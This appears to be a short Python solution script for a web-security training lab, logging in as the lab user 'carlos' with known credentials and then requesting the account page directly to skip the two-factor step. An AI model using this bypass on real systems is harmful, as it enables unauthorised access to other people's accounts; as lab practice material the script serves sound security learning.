import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# proxies = {"https": "https://127.0.0.1:8080", "http": "http://127.0.0.1:8080"}

def carlos_login(s, url):
    print("[*] Logging in as user carlos...")
    login = url + "/login"
    data = {"username": "carlos", "password": "montoya"}
    r = s.post(login, data=data, verify=False)
    my_account = url + "/my-account?id=carlos"
    r = s.get(my_account, verify=False)
    if "Log out" in r.text:
        print("[+] 2fa bypassed... Lab solved")
    else:
        print("[-] Error.")
        sys.exit(0)


def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <url>")
        sys.exit(0)

    s = requests.Session()
    url = sys.argv[1]
    carlos_login(s,url)

if __name__=="__main__":
    main()
